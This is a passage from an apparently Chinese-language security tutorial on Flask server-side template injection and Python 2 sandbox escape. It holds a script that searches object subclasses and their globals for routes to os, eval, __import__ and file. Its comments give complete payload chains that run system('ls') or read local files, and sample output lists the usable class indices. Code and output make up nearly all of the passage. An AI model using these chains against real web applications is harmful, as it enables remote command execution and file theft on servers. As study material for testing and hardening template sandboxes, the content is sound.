                <span class="hljs-string">&#x27;plat-netbsd1&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;nturl2path&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;tkinter&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;copy&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;pickletools&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;hashlib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;anydbm&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;keyword&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;timeit&#x27;</span>: [<span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;uu&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;StringIO&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;modulefinder&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;stringprep&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;markupbase&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;colorsys&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;shelve&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;multifile&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sre_parse&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;pickle&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-os2emx&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;mimetools&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;audiodev&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;copy_reg&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;sre_compile&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>], <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;idlelib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;site&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;getpass&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;imputil&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;bsddb&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;contextlib&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;numbers&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;io&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;plat-sunos5&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;symtable&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;pyclbr&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;shutil&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;lib2to3&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;threading&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dbhash&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;gettext&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;dumbdbm&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>],
                <span class="hljs-string">&#x27;_weakrefset&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;_abcoll&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;MimeWriter&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;test&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;opcode&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;csv&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;nntplib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;profile&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;genericpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;stat&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;__phello__.foo&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;sched&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;statvfs&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;trace&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;warnings&#x27;</span>: [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;symbol&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sets&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;urllib2&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;sunaudio&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;pdb.doc&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;asynchat&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;user&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;xmllib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;codeop&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-next3&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;types&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;argparse&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;uuid&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;plat-aix4&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;plat-aix3&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;ssl&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;poplib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;difflib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;urlparse&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;linecache&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;_strptime&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;htmllib&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;site-packages&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;posixpath&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;stringold&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;gzip&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>], <span class="hljs-string">&#x27;mhlib&#x27;</span>: [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>],
                <span class="hljs-string">&#x27;rlcompleter&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>], <span class="hljs-string">&#x27;hmac&#x27;</span>: [<span class="hljs-string">&#x27;__builtins__&#x27;</span>]&#125;
target_modules = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>]
target_functions = [<span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>]
all_targets = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(find_modules.keys() + target_modules + target_functions))
all_modules = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(find_modules.keys() + target_modules))
subclasses = ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()
sub_name = [s.__name__ <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> subclasses]
<span class="hljs-comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span>
print(<span class="hljs-string">&#x27;----------1-----------&#x27;</span>)
<span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sub_name):
    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:
        <span class="hljs-keyword">if</span> f == s:
            <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> target_functions:
                print(i, f)
            <span class="hljs-keyword">elif</span> f <span class="hljs-keyword">in</span> all_modules:
                target = find_modules[f]
                sub_dict = subclasses[i].__dict__
                <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> target:
                    <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> sub_dict:
                        print(i, f, target)
print(<span class="hljs-string">&#x27;----------2-----------&#x27;</span>)
<span class="hljs-comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span>
<span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):
    <span class="hljs-keyword">try</span>:
        more = sub.__init__.func_globals
        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> all_targets:
            <span class="hljs-keyword">if</span> m <span class="hljs-keyword">in</span> more:
                print(i, sub, m, find_modules.get(m))
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">pass</span>
print(<span class="hljs-string">&#x27;----------3-----------&#x27;</span>)
<span class="hljs-comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span>
<span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):
    <span class="hljs-keyword">try</span>:
        more = sub.__init__.func_globals.values()
        <span class="hljs-keyword">for</span> j, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(more):
            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:
                <span class="hljs-keyword">try</span>:
                    <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> v:
                        <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> target_functions:
                            print(i, j, sub, f)
                        <span class="hljs-keyword">elif</span> f <span class="hljs-keyword">in</span> all_modules:
                            target = find_modules.get(f)
                            sub_dict = v[f].__dict__
                            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> target:
                                <span class="hljs-keyword">if</span> t <span class="hljs-keyword">in</span> sub_dict:
                                    print(i, j, sub, f, target)
                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                    <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">pass</span>
print(<span class="hljs-string">&#x27;----------4-----------&#x27;</span>)
<span class="hljs-comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span>
<span class="hljs-comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span>
<span class="hljs-keyword">for</span> i, sub <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(subclasses):
    <span class="hljs-keyword">try</span>:
        more = sub()._module.__builtins__
        <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> all_targets:
            <span class="hljs-keyword">if</span> f <span class="hljs-keyword">in</span> more:
                print(i, f)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">pass</span></code></pre></div>



#### **运行结果**

<div class="hljs code-wrapper"><pre><code class="hljs bash">G:\Program\Python\tools\flask ssti&gt;python27 python2_find_chain.py
----------1-----------
(40, <span class="hljs-string">&#x27;file&#x27;</span>)
----------2-----------
(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;linecache&#x27;</span>, [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])
(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)
(59, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;types&#x27;</span>, [<span class="hljs-string">&#x27;__builtins__&#x27;</span>])
(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;linecache&#x27;</span>, [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])
(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)
(60, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;types&#x27;</span>, [<span class="hljs-string">&#x27;__builtins__&#x27;</span>])
(61, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(62, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;traceback&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])
(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;os&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>])
(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)
(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;traceback&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>])
(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;os&#x27;</span>, [<span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>])
(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)
(78, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(78, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)
(78, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>, None)
(79, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, None)
(79, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;sys&#x27;</span>, None)
(79, &lt;class <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>, None)
----------3-----------
(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(59, 13, &lt;class <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(60, 13, &lt;class <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(61, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(62, 1, &lt;class <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(72, 19, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(72, 19, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;exec&#x27;</span>)
(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;eval&#x27;</span>)
(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;open&#x27;</span>)
(72, 22, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, <span class="hljs-string">&#x27;execfile&#x27;</span>)
(77, 19, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(77, 19, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;exec&#x27;</span>)
(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;__import__&#x27;</span>)
(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;file&#x27;</span>)
(77, 22, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, <span class="hljs-string">&#x27;compile&#x27;</span>)
